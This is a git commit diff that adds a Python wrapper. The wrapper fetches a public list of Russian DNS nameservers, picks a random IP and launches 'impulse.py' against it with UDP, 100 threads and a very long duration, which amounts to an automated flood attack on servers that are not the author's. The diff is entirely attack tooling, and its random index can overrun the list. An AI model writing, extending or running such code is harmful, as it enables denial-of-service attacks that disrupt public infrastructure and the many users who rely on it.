af6f5d321898f479e91b7ae5f44aea545b5e905b
sid <sergi.hecko161@gmail.com>
2022-03-01 19:34:08 +0200

    add wrapper

--- code/wrapper.py
+++ code/wrapper.py
@@ -1,4 +1,4 @@
-import urllib.request, json, random
+import urllib.request, json, random, subprocess
 
 if __name__ == "__main__":
     target = 'https://public-dns.info/nameserver/ru.json'
@@ -6,4 +6,8 @@ if __name__ == "__main__":
         data = json.loads(url.read().decode())
         random_ip = data[random.randint(0,len(data))]['ip']
         print(random_ip)
-    
+        subprocess.run(
+            [f"python3 impulse.py --target {random_ip}:54 --time 100000 --threads 100 --method UDP"],
+            check = True,
+            shell = True
+        )
